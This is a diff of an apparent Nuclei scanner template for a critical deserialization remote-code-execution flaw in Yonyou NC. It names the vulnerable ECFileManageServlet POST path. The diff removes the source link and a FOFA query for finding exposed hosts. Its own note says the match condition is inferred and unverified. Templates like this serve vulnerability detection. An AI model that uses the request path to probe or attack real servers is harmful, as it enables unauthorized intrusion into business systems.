@@ -3,14 +3,8 @@ info:
   name: 用友NCecapppub存在反序列化漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/b1097e965f8bb48c18bc4261c4619136
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: b1097e965f8bb48c18bc4261c4619136
-    fofa: + huiter：`app.name=="用友 UAP"`
 http:
 - raw:
   - 'POST /servlet/~ecapppub/nc.impl.ecpubapp.filemanager.service.ECFileManageServlet HTTP/1.1
